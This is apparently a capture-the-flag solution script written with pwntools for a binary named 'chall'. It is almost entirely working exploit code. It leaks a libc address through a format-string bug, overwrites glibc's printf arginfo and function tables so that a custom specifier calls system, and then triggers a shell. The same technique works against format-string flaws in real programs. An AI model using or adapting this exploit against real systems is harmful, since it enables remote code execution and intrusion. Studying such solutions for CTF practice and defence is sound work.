#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.terminal = ["kitty", "@launch", "--location=split"]
exe = context.binary = ELF(args.EXE or '../dist/chall')
libc = ELF(libcdb.search_by_build_id("a43bfc8428df6623cd498c9c0caeb91aec9be4f9"))

host = args.HOST or '0.0.0.0'
port = int(args.PORT or 10003)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

io.sendline(b"%43$p")
libc.address = int(io.recvline(), 16) - libc.sym["__libc_start_call_main"] - 128
log.info(f"libc @ 0x{libc.address:x}")
assert libc.address & 0xfff == 0

__printf_arginfo_table = libc.sym["__printf_arginfo_table"]
__printf_function_table = libc.sym["__printf_function_table"]
fake_arginfo_table = libc.bss(8)

io.sendline(fmtstr_payload(8, {fake_arginfo_table + ord("X") * 8: libc.sym["system"]}))
io.sendline(fmtstr_payload(8, {__printf_arginfo_table: fake_arginfo_table}))
io.sendline(fmtstr_payload(8, {__printf_function_table: 1}, write_size="long"))

io.sendline(f"%.{u16(b'sh')}X".encode())

io.interactive()
